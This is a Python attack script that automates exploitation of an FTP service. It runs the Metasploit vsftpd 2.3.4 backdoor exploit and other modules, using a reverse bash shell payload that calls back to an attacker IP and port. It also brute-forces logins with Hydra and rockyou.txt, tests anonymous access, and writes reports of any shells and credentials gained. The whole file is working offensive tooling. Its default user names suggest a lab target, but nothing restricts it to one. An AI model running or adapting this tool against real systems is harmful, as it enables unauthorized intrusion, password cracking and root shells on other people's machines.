#!/usr/bin/env python3
import subprocess
import json
import re
import logging
import argparse
import sys
import time
import socket
from pathlib import Path
from typing import Dict, List, Tuple, Optional
from datetime import datetime

# Setup logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

# Constants
OUTPUT_DIR = Path("outputs")
ROCKYOU_PATH = Path("/usr/share/wordlists/rockyou.txt")


def run_command(cmd: List[str], timeout: int = 300, shell: bool = False, **kwargs) -> Tuple[str, bool]:
    """Run a command and return its output and success status."""
    cmd_str = ' '.join(cmd) if isinstance(cmd, list) else cmd
    logger.info(f"Running: {cmd_str}")
    try:
        result = subprocess.run(
            cmd,
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            timeout=timeout,
            **kwargs
        )
        return result.stdout.strip(), result.returncode == 0
    except subprocess.TimeoutExpired:
        logger.error(f"Command timed out: {cmd_str}")
        return "Command timed out", False
    except Exception as e:
        logger.error(f"Unexpected error running command {cmd_str}: {e}")
        return str(e), False


def run_metasploit_exploit(module: str, rhost: str, rport: int, payload: str, lhost: str, lport: int) -> Tuple[bool, str]:
    """Run a Metasploit exploit and return success status and output."""
    logger.info(f"Attempting Metasploit exploit: {module} on {rhost}:{rport}")
    msf_script_path = OUTPUT_DIR / f"msf_{module.split('/')[-1]}.rc"
    
    msf_commands = f"""
use {module}
set RHOSTS {rhost}
set RPORT {rport}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
    with msf_script_path.open("w") as f:
        f.write(msf_commands)

    cmd = ["msfconsole", "-q", "-r", str(msf_script_path)]
    output, success = run_command(cmd, timeout=600)

    # Improved success check
    is_successful = "session" in output.lower() and "opened" in output.lower() and "failed" not in output.lower()

    if is_successful:
        session_match = re.search(r"(meterpreter|shell|command) session (\d+) opened", output, re.IGNORECASE)
        if session_match:
            session_type = session_match.group(1)
            session_id = session_match.group(2)
            proof_output = f"Successfully opened {session_type} session {session_id}.\n"
            
            # Try to get basic info from the session
            logger.info(f"Session {session_id} opened, attempting to get system info...")
            session_cmd = f"sessions -i {session_id} -c 'whoami && id && uname -a'"
            msf_session_script_path = OUTPUT_DIR / "msf_session_check.rc"
            with msf_session_script_path.open("w") as f:
                f.write(f"{session_cmd}\nexit\n")
            
            session_check_output, _ = run_command(["msfconsole", "-q", "-r", str(msf_session_script_path)], timeout=300)
            proof_output += session_check_output
            return True, proof_output

    return is_successful, output


def test_ftp_anonymous_access(target: str, port: int) -> Optional[Dict]:
    """Test FTP anonymous access and prove access with a directory listing."""
    logger.info(f"Testing FTP anonymous access on {target}:{port}")
    
    ftp_commands = "user anonymous anonymous\nls -la\nquit"
    process = subprocess.Popen(["ftp", "-n", target, str(port)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    try:
        output, _ = process.communicate(ftp_commands, timeout=30)
    except subprocess.TimeoutExpired:
        process.kill()
        logger.warning("FTP anonymous access test timed out.")
        return None

    if "230" in output and "Login successful" in output and ("total" in output or "drwx" in output):
        logger.info("FTP anonymous access successful.")
        return {
            "type": "anonymous_access",
            "target": f"{target}:{port}",
            "details": "FTP Anonymous Access is allowed.",
            "impact": "Information Disclosure and potential for unauthorized file access.",
            "severity": "Medium",
            "poc": f"ftp -n {target} {port}\n> user anonymous anonymous\n> ls -la",
            "proof": output
        }
    return None


def test_ftp_brute_force(target: str, port: int, use_rockyou: bool, custom_wordlist: Optional[str]) -> Optional[Dict]:
    """Test FTP brute force using Hydra."""
    logger.info(f"Testing FTP brute force on {target}:{port}")
    
    common_users = ["msfadmin", "user", "postgres", "sys", "klog", "service", "root", "admin", "ftp", "anonymous", "guest"]
    user_list_path = OUTPUT_DIR / "ftp_user_list.txt"
    user_list_path.write_text("\n".join(common_users))
    
    wordlist_path = None
    wordlist_source = ""

    if custom_wordlist:
        if Path(custom_wordlist).exists():
            logger.info(f"Using custom wordlist: {custom_wordlist}")
            wordlist_path = Path(custom_wordlist)
            wordlist_source = f"custom wordlist ({custom_wordlist})"
        else:
            logger.error(f"Custom wordlist not found at: {custom_wordlist}. Aborting brute-force.")
            return None
    elif use_rockyou:
        if ROCKYOU_PATH.exists():
            logger.info("Using rockyou.txt for brute force.")
            wordlist_path = ROCKYOU_PATH
            wordlist_source = "rockyou.txt"
        else:
            logger.warning("rockyou.txt not found, falling back to default list.")

    if not wordlist_path:
        logger.info("Using built-in common password list for brute force.")
        common_passwords = ["msfadmin", "password", "123456", "admin", "root", "test", "user", "postgres", "batman", "service"]
        wordlist_path = OUTPUT_DIR / "ftp_common_pass.txt"
        wordlist_path.write_text("\n".join(common_passwords))
        wordlist_source = "built-in common passwords"

    hydra_cmd = [
        "hydra", "-L", str(user_list_path), "-P", str(wordlist_path.resolve()), 
        "-t", "4", "-s", str(port), f"ftp://{target}"
    ]
    output, success = run_command(hydra_cmd, timeout=1800) # 30 min timeout for hydra
    
    if success and "login:" in output and "password:" in output:
        cred_match = re.search(r"login:\s*(\S+)\s*password:\s*(\S+)", output)
        if cred_match:
            found_user, found_pass = cred_match.groups()
            logger.info(f"FTP brute force successful: {found_user}:{found_pass}")
            
            # Prove access with directory listing
            ftp_commands = f"user {found_user} {found_pass}\nls -la\nquit"
            process = subprocess.Popen(["ftp", "-n", target, str(port)], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            proof_output, _ = process.communicate(ftp_commands, timeout=30)
            
            return {
                "type": "brute_force",
                "target": f"{target}:{port}",
                "details": f"FTP Brute Force with {wordlist_source} successful: {found_user}:{found_pass}",
                "impact": "Unauthorized Access, potential for full system compromise.",
                "severity": "High",
                "poc": ' '.join(hydra_cmd),
                "proof": proof_output
            }
    return None


def test_ftp_vsftpd_backdoor(target: str, port: int) -> Optional[Dict]:
    """Test vsftpd backdoor vulnerability using a corrected Metasploit script based on manual analysis."""
    logger.info(f"Retrying vsftpd backdoor on {target}:{port} with a corrected and simplified Metasploit script.")

    msf_script_path = OUTPUT_DIR / "msf_vsftpd_exploit_corrected.rc"
    
    # This is the simplified, correct script based on proven manual testing.
    # No LHOST, LPORT, or custom payload is needed as the exploit is self-contained.
    msf_commands = f"""
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS {target}
set RPORT {port}
exploit
exit
"""
    with msf_script_path.open("w") as f:
        f.write(msf_commands)

    cmd = ["msfconsole", "-q", "-r", str(msf_script_path)]
    output, _ = run_command(cmd, timeout=300)

    # Look for the definitive proof of success in the Metasploit output.
    # The key indicators are "Found shell" and "uid=0(root)".
    if "Found shell" in output and "uid=0(root)" in output:
        logger.info("vsftpd backdoor exploited successfully with Metasploit.")
        
        # Extract the relevant proof lines from the output for a clean report
        proof_lines = [line.strip() for line in output.splitlines() if "Backdoor service" in line or "Found shell" in line or "UID:" in line]
        proof_text = "\n".join(proof_lines)

        return {
            "type": "backdoor",
            "target": f"{target}:{port}",
            "details": "vsftpd 2.3.4 Backdoor (CVE-2011-2523) successfully exploited with Metasploit.",
            "impact": "Remote Code Execution as root.",
            "severity": "Critical",
            "poc": f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; set RPORT {port}; exploit'",
            "proof": proof_text or output  # Fallback to full output if parsing fails
        }
    
    logger.error(f"Failed to exploit vsftpd backdoor with the corrected Metasploit script. Full output below:\n{output}")
    return None


def test_exploitdb_modules(target: str, port: int, exploitdb_mods: List[str]) -> List[Dict]:
    """Analyze Exploit-DB modules and return actionable results, avoiding duplicates."""
    logger.info("Analyzing Exploit-DB modules from reconnaissance.")
    results = []
    processed_titles = set()

    # Prioritize Metasploit (.rb) modules by sorting them to appear first
    sorted_mods = sorted(exploitdb_mods, key=lambda x: ".rb" not in x)

    for mod in sorted_mods:
        if mod == "none": continue

        # Extract the core title of the exploit before the parenthesized path
        title_match = re.search(r'^(.*?)\s*\(', mod)
        if not title_match: continue
        title = title_match.group(1).strip()

        # If we have already processed an exploit for this title, skip to avoid duplicates
        if title in processed_titles:
            logger.info(f"Skipping duplicate exploit finding for title: {title}")
            continue
        
        processed_titles.add(title)
        
        path_match = re.search(r'\((.*?)\)', mod)
        if not path_match: continue
        
        path = path_match.group(1)
        poc = ""
        severity = "High" # Default severity
        exploit_id = path.split('/')[-1].split('.')[0]

        if ".rb" in path:
            poc = f"msfconsole -q -x 'use {path}; set RHOSTS {target}; set RPORT {port}; run'"
            details = f"Metasploit module from Exploit-DB: {mod}. Needs manual execution."
        elif ".py" in path:
            poc = f"searchsploit -p {exploit_id} && python <path_to_exploit> {target} {port}"
            details = f"Python exploit from Exploit-DB: {mod}. Needs path adjustment and manual execution."
        else:
            details = f"Exploit-DB entry: {mod}. Requires manual review and execution."
            poc = f"searchsploit -x {exploit_id}"

        results.append({
            "type": "exploitdb_finding",
            "target": f"{target}:{port}",
            "details": details,
            "impact": "Varies, requires manual assessment.",
            "severity": severity,
            "poc": poc,
            "proof": "This is a finding, not a proven exploit. Manual verification is required."
        })
    return results


def exploit_target(metadata: Dict, attacker_ip: str, attacker_port: int, use_rockyou: bool, custom_wordlist: Optional[str]) -> List[Dict]:
    """Comprehensive FTP exploitation using reconnaissance data."""
    target = metadata["target"]
    port = metadata["port"]
    logger.info(f"Starting comprehensive FTP exploitation of {target}:{port} using reconnaissance data")
    
    exploits = []
    
    # Highest priority: Check for the vsftpd backdoor if detected by recon
    if metadata.get("backdoor_detected") == "yes":
        logger.info("Recon data indicates a potential vsftpd backdoor. Testing it first.")
        backdoor_exploit = test_ftp_vsftpd_backdoor(target, port)
        if backdoor_exploit:
            exploits.append(backdoor_exploit)
            # If we get a root shell, we can arguably stop, but we'll continue for completeness.
    
    # Test anonymous access if allowed
    if metadata.get("anonymous_login_allowed") == "yes":
        anon_exploit = test_ftp_anonymous_access(target, port)
        if anon_exploit:
            exploits.append(anon_exploit)

    # Test brute force (can run in parallel with other checks in a real scenario)
    brute_exploit = test_ftp_brute_force(target, port, use_rockyou, custom_wordlist)
    if brute_exploit:
        exploits.append(brute_exploit)

    # Analyze ExploitDB modules from recon
    exploitdb_findings = test_exploitdb_modules(target, port, metadata.get("exploitdb_mods", []))
    if exploitdb_findings:
        exploits.extend(exploitdb_findings)

    # Test Metasploit exploits from recon, avoiding duplicates
    msf_mods_to_test = set(metadata.get("msf_mods", []))
    if "exploit/unix/ftp/vsftpd_234_backdoor" in msf_mods_to_test:
        msf_mods_to_test.remove("exploit/unix/ftp/vsftpd_234_backdoor") # Already tested
    
    if msf_mods_to_test:
        logger.info(f"Testing {len(msf_mods_to_test)} additional Metasploit modules from recon.")
        for module in msf_mods_to_test:
            # We'll use a generic reverse shell payload here
            success, proof = run_metasploit_exploit(
                module, target, port, "cmd/unix/reverse_bash", attacker_ip, attacker_port
            )
            if success:
                exploits.append({
                    "type": "metasploit_exploit",
                    "target": f"{target}:{port}",
                    "details": f"Successfully exploited with Metasploit module: {module}",
                    "impact": "Varies (likely Remote Code Execution)",
                    "severity": "High",
                    "poc": f"msfconsole -q -x 'use {module}; set RHOSTS {target}; set RPORT {port}; set LHOST {attacker_ip}; set LPORT {attacker_port}; run'",
                    "proof": proof
                })

    logger.info(f"Exploitation complete. Found {len(exploits)} successful exploits.")
    return exploits


def save_exploit_report(exploits: List[Dict], target: str, port: int) -> None:
    """Save exploitation results to JSON and Markdown files."""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Prepare report data
    report_data = {
        "target": target,
        "port": port,
        "timestamp": timestamp,
        "successful_exploits": exploits,
        "summary": {
            "total_exploits": len(exploits),
            "critical_exploits": len([e for e in exploits if e.get("severity") == "Critical"]),
            "high_exploits": len([e for e in exploits if e.get("severity") == "High"]),
            "medium_exploits": len([e for e in exploits if e.get("severity") == "Medium"]),
        }
    }
    
    # Save JSON report
    json_path = OUTPUT_DIR / f"{target}_{port}_ftp_exploit.json"
    with json_path.open("w") as f:
        json.dump(report_data, f, indent=4)
    logger.info(f"JSON report saved: {json_path}")
    
    # Generate Markdown report
    md_content = f"""# FTP Exploitation Report for {target}:{port}

**Timestamp:** {timestamp}
**Total Exploits Found:** {len(exploits)}

## Summary
- **Critical Exploits:** {report_data['summary']['critical_exploits']}
- **High Exploits:** {report_data['summary']['high_exploits']}
- **Medium Exploits:** {report_data['summary']['medium_exploits']}

## Successful Exploits
"""
    
    if not exploits:
        md_content += "\nNo successful exploits were found.\n"
    else:
        for i, exploit in enumerate(exploits, 1):
            md_content += f"""### {i}. {exploit['type'].replace('_', ' ').title()}

- **Severity:** `{exploit['severity']}`
- **Impact:** {exploit['impact']}
- **Details:** {exploit['details']}

**Proof of Concept:**
```bash
{exploit['poc']}
```

**Proof of Exploitation (Evidence):**
```
{exploit['proof']}
```
---
"""
    
    md_path = OUTPUT_DIR / f"{target}_{port}_ftp_exploit.md"
    with md_path.open("w") as f:
        f.write(md_content)
    logger.info(f"Markdown report saved: {md_path}")


def find_metadata_file(target: str, port: int) -> Optional[Path]:
    """Find the metadata file for the target and port."""
    metadata_file = OUTPUT_DIR / f"{target}_{port}_ftp_metadata.json"
    if metadata_file.exists():
        return metadata_file
    
    # Fallback to old filename for compatibility
    old_metadata_file = OUTPUT_DIR / f"{target}_ftp_metadata.json"
    if old_metadata_file.exists():
        logger.warning("Found old metadata file format. Please re-run recon script for best results.")
        return old_metadata_file

    logger.error(f"No metadata file found for {target} on port {port}. Please run the recon script first.")
    return None


def main():
    parser = argparse.ArgumentParser(description="Advanced FTP Exploitation Script")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("--port", type=int, default=21, help="Target FTP port (default: 21)")
    parser.add_argument("--attacker-ip", required=True, help="Attacker IP address for reverse shells")
    parser.add_argument("--attacker-port", type=int, default=4444, help="Attacker port for reverse shells (default: 4444)")
    parser.add_argument("--use-rockyou", action="store_true", help="Use rockyou.txt for brute forcing (if no other wordlist is specified).")
    parser.add_argument("--wordlist", type=str, help="Path to a custom password wordlist for brute forcing.")
    
    args = parser.parse_args()
    
    try:
        # Find and load metadata
        metadata_file = find_metadata_file(args.target, args.port)
        if not metadata_file:
            sys.exit(1)
            
        with metadata_file.open("r") as f:
            metadata = json.load(f)
        
        # Run exploitation
        exploits = exploit_target(metadata, args.attacker_ip, args.attacker_port, args.use_rockyou, args.wordlist)
        
        # Save results
        save_exploit_report(exploits, args.target, args.port)
        
    except Exception as e:
        logger.error(f"An unexpected error occurred during exploitation: {e}", exc_info=True)
        sys.exit(1)


if __name__ == "__main__":
    main() 